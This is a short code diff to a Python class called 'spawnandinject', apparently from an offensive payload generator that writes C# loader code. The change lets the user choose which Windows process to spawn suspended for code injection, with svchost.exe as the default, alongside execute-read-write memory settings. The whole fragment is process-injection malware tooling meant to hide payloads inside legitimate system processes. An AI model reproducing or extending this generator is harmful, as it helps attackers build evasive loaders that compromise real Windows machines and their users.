@@ -5,6 +5,10 @@ class spawnandinject:
                 self.memoryPermission = '0x40'
             else:
                 self.memoryPermission = '0x20'
+        if 'target' in arguments:
+            self.target = arguments['target'].replace('\\','\\\\')
+        else:
+            self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
 
     def imports(self) -> list[str]:
         return ["using System;",
@@ -128,7 +132,7 @@ namespace ClassLibrary1
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
-            CreateProcess(null, "C:\\\\Windows\\\\System32\\\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+            CreateProcess(null, "{self.target}", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
 
             {transformers}
 
